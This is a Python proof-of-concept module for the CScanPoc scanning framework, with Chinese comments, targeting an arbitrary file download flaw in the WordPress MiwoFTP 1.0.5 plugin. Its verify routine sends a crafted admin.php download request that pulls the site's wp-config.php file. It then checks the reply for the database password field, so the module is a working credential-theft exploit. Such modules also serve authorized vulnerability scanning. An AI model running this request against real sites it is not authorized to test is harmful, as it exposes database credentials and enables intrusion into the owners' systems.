# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0036'  # 平台漏洞编号，留空
    name = 'WordPress MiwoFTP 1.0.5 插件任意文件漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        WordPress MiwoFTP 1.0.5 插件任意文件漏洞
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36801/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress MiwoFTP 1.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '374f0c47-6ca0-4dea-8726-09c71064c452'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes"
            verify_url = '{target}'.format(target=self.target)+payload
            code, head, res, _, _ = hh.http(verify_url)

            if code == 200 and res.find('DB_PASSWORD') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()